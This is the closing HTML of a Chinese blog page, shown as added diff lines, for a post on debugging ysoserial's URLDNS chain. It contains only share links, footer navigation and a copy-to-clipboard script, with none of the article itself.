+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=ysoserial URLDNS 调试分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&name=ysoserial URLDNS 调试分析&description=&lt;p&gt;以 URLDNS 作为 ysoserial 调试分析的开端，调试环境 JDK 1.8 &lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&t=ysoserial URLDNS 调试分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
